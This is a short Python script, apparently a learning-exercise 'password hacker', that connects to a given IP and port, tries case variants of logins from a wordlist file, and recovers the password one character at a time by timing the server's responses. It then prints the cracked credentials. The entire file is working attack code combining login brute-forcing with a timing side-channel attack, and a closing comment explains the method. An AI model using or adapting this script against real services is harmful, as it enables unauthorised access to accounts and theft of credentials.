import argparse
import socket
import itertools
import json
import string
import time

parser = argparse.ArgumentParser(description="suppa hackka")
parser.add_argument('ip',  help='ip address', type=str)
parser.add_argument('port',  help='port', type=int)
args = parser.parse_args()

client = socket.socket()
client.connect((args.ip, args.port))


def send_response(logn: str, passwd: str):
    """accepts login, passwd as args, sends it to server, returns server message"""
    msg_dict = {"login": logn, "password": passwd}
    msg = json.dumps(msg_dict)
    client.send(msg.encode('utf8'))
    return json.loads(client.recv(1024).decode())['result']


with open(r"C:\down\logins.txt", "r") as f:
    logins = [x.replace('\n', '') for x in f.readlines()]


def find_login():
    global login
    for i in logins:
        possible = [[letter.lower(), letter.upper()] for letter in i]
        iter_obj = itertools.product(*possible)
        try:
            while True:
                this_login = ''.join(next(iter_obj))
                if send_response(this_login, ' ') == 'Wrong password!':
                    return this_login
        except StopIteration: pass


login = find_login()

password = ''
result = None


def find_password():
    global password, login, result
    while True:
        for char in (string.ascii_lowercase + string.ascii_uppercase + string.digits):
            this_pass = password + char
            start = time.time()
            result = send_response(login, this_pass)
            end = time.time()
            if result == "Wrong password!" and ((end - start) >= 0.1):
                password += char
                break
            elif result == "Connection success!":
                password += char
                creds = {
                    "login": login,
                    "password": password
                }
                print(json.dumps(creds))
                return


find_password()

client.close()
'''
when the password beginning matches the current password, 
it takes more time for the server to handle the exception and 
return the wrong password message instead of exception message

TODO:
first do one iteration of characters, and store the output about how much time it took for each call
from that, find the one time that is different than others.
DONE - 0.1 seconds is the time when the beginning is currect

now you have the time, when the time taken is more than or equal to this, 
then you know the beginning of the password is correct, hence add it 
'''